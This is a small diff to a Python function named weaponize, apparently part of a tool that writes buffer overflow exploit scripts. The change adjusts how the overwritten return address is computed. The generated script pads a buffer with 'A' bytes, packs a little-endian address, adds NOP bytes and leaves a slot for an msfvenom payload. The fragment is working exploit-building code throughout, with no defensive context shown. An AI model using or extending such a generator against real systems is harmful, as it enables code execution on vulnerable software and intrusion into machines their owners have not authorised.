@@ -719,7 +719,7 @@ def weaponize(target_binary, target_platform, target_architecture, target_type, 
     script += "buf =  b''\n"
     script += f"buf += {bytes(target_prefix, 'ascii')}\n"
     script += f"buf += b'A' * {target_offset}\n"
-    script += "buf += struct.pack(\"<I\", int(BASE_ADDRESS, 16)) # little endian pack\n"
+    script += f"buf += struct.pack(\"<I\", (int(BASE_ADDRESS, 16) + {target_instruction_offset_distance})) # little endian pack\n"
     script += "buf += b'\\x90' * 10 # safety nops\n\n"
 
     script += "# payload (easy swap from msfvenom)\n"
